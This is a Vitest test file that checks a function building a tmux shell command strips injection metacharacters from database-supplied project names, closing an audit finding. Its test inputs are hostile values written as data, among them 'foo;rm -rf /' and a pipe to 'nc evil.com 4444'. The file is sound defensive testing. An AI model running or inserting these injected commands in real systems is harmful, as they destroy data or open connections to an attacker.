/**
 * Phase 31 — closes audit finding [30.D1].
 *
 * `queuedPlaceholderCmd` builds a shell string that gets passed
 * directly to `execSync` via tmux. Project name flows in from the DB
 * and must not be able to inject `;`, `$(…)`, backticks, or newlines
 * into the resulting command. Before this phase the function stripped
 * only single quotes — every other shell metachar passed through.
 */
import { describe, it, expect } from "vitest";
import { queuedPlaceholderCmd } from "./claude-dispatcher";

describe("queuedPlaceholderCmd — shell-injection guard", () => {
  it("strips semicolons", () => {
    const out = queuedPlaceholderCmd("foo;rm -rf /");
    expect(out).not.toMatch(/;rm/);
  });

  it("strips command substitution", () => {
    const out = queuedPlaceholderCmd("foo$(echo pwned)");
    expect(out).not.toContain("$(");
    expect(out).not.toContain("$");
  });

  it("strips backticks", () => {
    const out = queuedPlaceholderCmd("foo`whoami`");
    expect(out).not.toContain("`");
  });

  it("strips newlines and carriage returns", () => {
    const out = queuedPlaceholderCmd("foo\nrm bar\rmaliciously");
    expect(out).not.toMatch(/\n|\r/);
  });

  it("strips pipe and redirection metachars", () => {
    const out = queuedPlaceholderCmd("foo|nc evil.com 4444");
    expect(out).not.toContain("|");
  });

  it("preserves a benign project name unchanged", () => {
    const out = queuedPlaceholderCmd("cascade");
    expect(out).toContain("[queued: cascade]");
  });
});
